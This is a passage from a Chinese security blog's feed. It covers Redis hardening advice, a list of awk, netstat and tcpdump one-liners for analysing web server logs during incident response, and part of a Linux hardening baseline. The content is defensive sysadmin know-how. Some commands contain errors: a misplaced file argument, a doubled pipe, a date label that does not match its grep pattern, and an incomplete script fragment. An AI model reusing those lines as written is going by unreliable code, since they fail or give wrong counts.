title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h2><p>补充来自博客园：@梦猩魂</p><p>完善来自博客园：@我超怕的</p><p><strong>漏洞描述</strong></p><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><p><strong>安全建议</strong></p><p>1.禁用一些高危命令</p><p>　　常见如：flushdb，flushall，config，keys 等</p><p>2.以低权限运行 Redis 服务</p><p>3.为 Redis 添加密码验证</p><p>4.禁止外网访问 Redis</p><p>5.保证 authorized_keys 文件的安全</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-SQL注入&quot;&gt;&lt;a href=&quot;#1-SQL注入&quot; class=&quot;headerlink&quot; title=&quot;1.SQL注入&quot;&gt;&lt;/a&gt;1.SQL注入&lt;/h2&gt;&lt;p&gt;　　&lt;strong&gt;漏洞描述&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Web程序中对于用户提交的参数未做
      
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>web入侵日志分析命令</title>
    <link href="http://yoursite.com/2021/access%E6%97%A5%E5%BF%97.html"/>
    <id>http://yoursite.com/2021/access%E6%97%A5%E5%BF%97.html</id>
    <published>2021-04-17T06:52:05.000Z</published>
    <updated>2021-04-17T06:56:25.364Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在应急响应或者入侵排查中常常会涉及服务器日志分析，在web日志中可以获取很多关键信息，如访问量最多的IP、访问次数最多的页面等等，于是收集，整理一些服务器日志分析命令</p></blockquote><p><strong>1、查看有多少个IP访问：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; log_file|sort|uniq|wc -l</span><br></pre></td></tr></table></figure><p><strong>2、查看某一个页面被访问的次数：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;&#x2F;index.php&quot; log_file | wc -l</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>3、查看每一个IP访问了多少个页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#39; log_file &gt; log.txt</span><br><span class="line">$ sort -n -t &#39; &#39; -k 2 log.txt 配合sort进一步排序</span><br></pre></td></tr></table></figure><p><strong>4、将每个IP访问的页面数进行从小到大排序：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#39; log_file | sort -n</span><br></pre></td></tr></table></figure><p><strong>5、查看某一个IP访问了哪些页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep ^111.111.111.111 log_file| awk &#39;&#123;print $1,$7&#125;&#39;</span><br></pre></td></tr></table></figure><p><strong>6、去掉搜索引擎统计的页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $12,$1&#125;&#39; log_file | grep ^&quot;Mozilla | awk &#39;&#123;print $2&#125;&#39; |sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><strong>7、查看2020年4月17日02时这一个小时内有多少IP访问:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $4,$1&#125;&#39; log_file | grep 17&#x2F;Jan&#x2F;2020:02 | awk &#39;&#123;print $2&#125;&#39;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><strong>8、查看访问前十个ip地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; |sort|uniq -c|sort -nr |head -10 access_log</span><br></pre></td></tr></table></figure><p><strong>uniq -c 相当于分组统计并把统计数放在最前面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br><span class="line">$ cat access.log|awk &#39;&#123;counts[$(11)]+&#x3D;1&#125;; END &#123;for(url in counts) print counts[url], url&#125;</span><br></pre></td></tr></table></figure><p><strong>9、访问次数最多的10个文件或页面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file|awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr | head -10</span><br><span class="line">$ cat log_file|awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr|head -20</span><br><span class="line">$ awk &#39;&#123;print $1&#125;&#39; log_file |sort -n -r |uniq -c | sort -n -r | head -20</span><br></pre></td></tr></table></figure><p>访问量最大的前20个ip</p><p><strong>10、通过子域名访问次数，依据referer来计算，稍有不准</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | awk &#39;&#123;print $11&#125;&#39; | sed -e &#39; s&#x2F;http:&#x2F;&#x2F;&#x2F;&#x2F;&#39; -e &#39; s&#x2F;&#x2F;.*&#x2F;&#x2F;&#39; | sort | uniq -c | sort -rn | head -20</span><br></pre></td></tr></table></figure><p><strong>11、列出传输大小最大的几个文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $10 &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>12、列出输出大于200000byte(约200kb)的页面以及对应页面发生次数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($10 &gt; 200000 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>13、如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>14、列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 60 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>15、列出传输时间超过 30 秒的文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 30)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure><p><strong>16、列出当前服务器每一进程运行的数量，倒序排列</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | awk -F &#39; &#39; &#39;&#123;print $8 &quot; &quot; $9&#125;&#39; |sort | uniq -c |sort -nr |head -20</span><br></pre></td></tr></table></figure><p><strong>17、查看apache当前并发访问数</strong></p><p>对比httpd.conf中MaxClients的数字差距多少</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -an | grep ESTABLISHED | wc -l</span><br></pre></td></tr></table></figure><p><strong>18、可以使用如下参数查看数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef|grep httpd|wc -l</span><br><span class="line">1388</span><br></pre></td></tr></table></figure><p>统计httpd进程数，连个请求会启动一个进程，使用于Apache服务器。<br>表示Apache能够处理1388个并发请求，这个值Apache可根据负载情况自动调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat|grep -i &quot;80&quot;|wc -l</span><br><span class="line">4341</span><br></pre></td></tr></table></figure><p>netstat -an会打印系统当前网络链接状态，而grep -i “80”是用来提取与80端口有关的连接的，wc -l进行连接数统计。<br>最终返回的数字就是当前所有80端口的请求总数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -na|grep ESTABLISHED|wc -l</span><br><span class="line">376</span><br></pre></td></tr></table></figure><p>netstat -an会打印系统当前网络链接状态，而grep ESTABLISHED 提取出已建立连接的信息。然后wc -l统计最终返回的数字就是当前所有80端口的已建立连接的总数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat||grep ESTABLISHED|wc</span><br></pre></td></tr></table></figure><p>可查看所有建立连接的详细记录</p><p><strong>19、输出每个ip的连接数，以及总的各个状态的连接数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;n&#x3D;split($(NF-1),array,&quot;:&quot;);if(n&lt;&#x3D;2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N&#125; END &#123;for(a in S)&#123;printf(&quot;%-20s %s&quot;, a, S[a]);++I&#125;printf(&quot;%-20s %s&quot;,&quot;TOTAL_IP&quot;,I);for(a in s) printf(&quot;%-20s %s&quot;,a, s[a]);printf(&quot;%-20s %s&quot;,&quot;TOTAL_LINK&quot;,N);&#125;&#39;</span><br></pre></td></tr></table></figure><p><strong>20、其他的收集</strong></p><p>分析日志文件下 2012-05-04 访问页面最高 的前20个 URL 并排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |grep &#39;17&#x2F;Apr&#x2F;2021&#39;| awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure><p>查询受访问页面的URL地址中 含有 <a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 网址的 IP 地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access_log | awk &#39;($11~&#x2F;www.abc.com&#x2F;)&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><p>获取访问最高的10个IP地址 同时也可以按时间来查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat linewow-access.log|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure><p>时间段查询日志时间段的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file | egrep &#39;15&#x2F;Apr&#x2F;2021|17&#x2F;Apr&#x2F;2021&#39; |awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure><p>分析2021/4/15 到 2021/4/17 访问”/index.php?g=Member&amp;m=Public&amp;a=sendValidCode”的IP倒序排列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file | egrep &#39;15&#x2F;Apr&#x2F;2021|17&#x2F;Apr&#x2F;2021&#39; | awk &#39;&#123;if($7 &#x3D;&#x3D; &quot;&#x2F;index.php?g&#x3D;Member&amp;m&#x3D;Public&amp;a&#x3D;sendValidCode&quot;) print $1,$7&#125;&#39;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><p>($7~/.php/) $7里面包含.php的就输出,本句的意思是最耗时的一百个PHP页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p>列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 60 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p>统计网站流量（G)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;&#123;sum+&#x3D;$10&#125; END &#123;print sum&#x2F;1024&#x2F;1024&#x2F;1024&#125;&#39;</span><br></pre></td></tr></table></figure><p>统计404的连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;($9 ~&#x2F;404&#x2F;)&#39; access.log | awk &#39;&#123;print $9,$7&#125;&#39; | sort</span><br></pre></td></tr></table></figure><p>统计http status</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;&#123;counts[$(9)]+&#x3D;1&#125;; END &#123;for(code in counts) print code, counts[code]&#125;&#39; </span><br><span class="line">$ cat access.log |awk &#39;&#123;print $9&#125;&#39;|sort|uniq -c|sort -rn</span><br></pre></td></tr></table></figure><p>每秒并发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ watch &quot;awk &#39;&#123;if($9~&#x2F;200|30|404&#x2F;)COUNT[$4]++&#125;END&#123;for( a in COUNT) print a,COUNT[a]&#125;&#39; log_file|sort -k 2 -nr|head -n10&quot;</span><br></pre></td></tr></table></figure><p>带宽统计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat apache.log |awk &#39;&#123;if($7~&#x2F;GET&#x2F;) count++&#125;END&#123;print &quot;client_request&#x3D;&quot;count&#125;&#39; </span><br><span class="line">$ cat apache.log |awk &#39;&#123;BYTE+&#x3D;$11&#125;END&#123;print &quot;client_kbyte_out&#x3D;&quot;BYTE&#x2F;1024&quot;KB&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>找出某天访问次数最多的10个IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | grep &quot;15&#x2F;Apr&#x2F;2021&quot; |awk &#39;&#123;print $3&#125;&#39;|sort |uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure><p>当天ip连接数最高的ip都在干些什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | grep &quot;10.0.21.17&quot; | awk &#39;&#123;print $8&#125;&#39; | sort | uniq -c | sort -nr | head -n 10</span><br></pre></td></tr></table></figure><p>小时单位里ip连接数最多的10个时段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk -vFS&#x3D;&quot;[:]&quot; &#39;&#123;gsub(&quot;-.*&quot;,&quot;&quot;,$1);num[$2&quot; &quot;$1]++&#125;END&#123;for(i in num)print i,num[i]&#125;&#39; log_file | sort -n -k 3 -r | head -10</span><br></pre></td></tr></table></figure><p>找出访问次数最多的几个分钟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; access.log | grep &quot;20&#x2F;Mar&#x2F;2011&quot; |cut -c 14-18|sort|uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure><p>取5分钟日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ if [ $DATE_MINUTE !&#x3D; $DATE_END_MINUTE ] ;then #则判断开始时间戳与结束时间戳是否相等</span><br><span class="line">START_LINE&#x3D;sed -n &quot;&#x2F;$DATE_MINUTE&#x2F;&#x3D;&quot; $APACHE_LOG|head -n1 #如果不相等，则取出开始时间戳的行号，与结束时间戳的行号</span><br></pre></td></tr></table></figure><p>查看tcp的链接状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat |awk &#39;&#123;print $6&#125;&#39;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125;;END &#123;for(a in S) print a, S[a]&#125;&#39; </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++state[$NF]&#125;; END &#123;for(key in state) print key,&quot;&quot;,state[key]&#125;&#39; </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++arr[$NF]&#125;;END &#123;for(k in arr) print k,&quot;&quot;,arr[k]&#125;&#39; </span><br><span class="line">$ netstat -n |awk &#39;&#x2F;^tcp&#x2F; &#123;print $NF&#125;&#39;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -ant | awk &#39;&#123;print $NF&#125;&#39; | grep -v &#39;[a-z]&#39; | sort | uniq -c</span><br><span class="line">$ netstat -ant|awk &#39;&#x2F;ip:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#39; |sort -n </span><br><span class="line">$ netstat -ant|awk &#39;&#x2F;:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#39; |sort -rn|head -n 10 </span><br><span class="line">$ awk &#39;BEGIN&#123;printf (&quot;http_codecount_num&quot;)&#125;&#123;COUNT[$10]++&#125;END&#123;for (a in COUNT) printf a&quot;&quot;COUNT[a]&quot;&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>查找请求数前20个IP（常用于查找攻来源）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -anlp|grep 80|grep tcp|awk &#39;&#123;print $5&#125;&#39;|awk -F: &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -n20 </span><br><span class="line">$ netstat -ant |awk &#39;&#x2F;:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&#39; |sort -rn|head -n20</span><br></pre></td></tr></table></figure><p>用tcpdump嗅探80端口的访问看看谁最高</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#39; | sort | uniq -c | sort -nr |head -20</span><br></pre></td></tr></table></figure><p>查找较多time_wait连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -n|grep TIME_WAIT|awk &#39;&#123;print $5&#125;&#39;|sort|uniq -c|sort -rn|head -n20</span><br></pre></td></tr></table></figure><p>找查较多的SYN连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -an | grep SYN | awk &#39;&#123;print $5&#125;&#39; | awk -F: &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>根据端口列进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -ntlp | grep 80 | awk &#39;&#123;print $7&#125;&#39; | cut -d&#x2F; -f1</span><br></pre></td></tr></table></figure><p>查看了连接数和当前的连接数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -ant | grep $ip:80 | wc -l </span><br><span class="line">$ netstat -ant | grep $ip:80 | grep EST | wc -l</span><br></pre></td></tr></table></figure><p>查看IP访问次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat|grep &quot;:80&quot;|awk &#39;&#123;print $5&#125;&#39; |awk -F: &#39;&#123;print $1&#125;&#39; | sort| uniq -c|sort -n</span><br></pre></td></tr></table></figure><p>Linux命令分析当前的链接状况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#39;</span><br><span class="line">$watch &quot;netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#39;&quot; # 通过watch可以一直监控</span><br><span class="line">$LAST_ACK 5 #关闭一个TCP连接需要从两个方向上分别进行关闭，双方都是通过发送FIN来表示单方向数据的关闭，当通信双方发送了最后一个FIN的时候，发送方此时处于LAST_ACK状态，当发送方收到对方的确认（Fin的Ack确认）后才真正关闭整个TCP连接；</span><br><span class="line"></span><br><span class="line">$SYN_RECV 30  # 表示正在等待处理的请求数；</span><br><span class="line"></span><br><span class="line">$ESTABLISHED 1597 # 表示正常数据传输状态； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT1 51 # 表示server端主动要求关闭tcp连接； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT2 504 # 表示客户端中断连接； </span><br><span class="line"></span><br><span class="line">$TIME_WAIT 1057  # 表示处理完毕，等待超时结束的请求数；</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;在应急响应或者入侵排查中常常会涉及服务器日志分析，在web日志中可以获取很多关键信息，如访问量最多的IP、访问次数最多的页面等等，于是收集，整理一些服务器日志分析命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1、查看有多少个IP访问：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ awk &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39; log_file|sort|uniq|wc -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;2、查看某一个页面被访问的次数：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ grep &amp;quot;&amp;#x2F;index.php&amp;quot; log_file | wc -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux主机安全配置规范</title>
    <link href="http://yoursite.com/2021/Linux%E5%9F%BA%E7%BA%BF.html"/>
    <id>http://yoursite.com/2021/Linux%E5%9F%BA%E7%BA%BF.html</id>
    <published>2021-04-14T05:51:33.000Z</published>
    <updated>2021-04-14T06:22:47.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure><p><strong>2 配置口令生存周期</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure><p><strong>3 配置密码复杂度策略</strong></p><p>  CentOS系统：修改/etc/pam.d/system-auth文件, 在ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<a id="more"></a><br>例如：password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p><p><strong>4 限定用户su到root</strong></p><p>  编辑su文件(vi /etc/pam.d/su)，在开头添加下面两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure><p>这表明只有wheel组的成员可以使用su命令成为root用户。</p><h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件&#x2F;etc&#x2F;profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure><p><strong>2 设置命令行界面超时退出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;profile,增加 export TMOUT&#x3D;300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure><p><strong>3 禁止root用户远程ssh登录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure><p><strong>4 启用syslog日志审计</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;rsyslog.conf, 配置: authpriv.* &#x2F;var&#x2F;log&#x2F;secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure><h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;vsftpd.conf(或&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf)文件，设置：anonymous_enable&#x3D;NO</span><br></pre></td></tr></table></figure><p><strong>2 禁止root登录VSFTP</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;ftpusers(或&#x2F;etc&#x2F;vsftpd&#x2F;ftpusers)文件，添加root</span><br></pre></td></tr></table></figure><p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p><h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 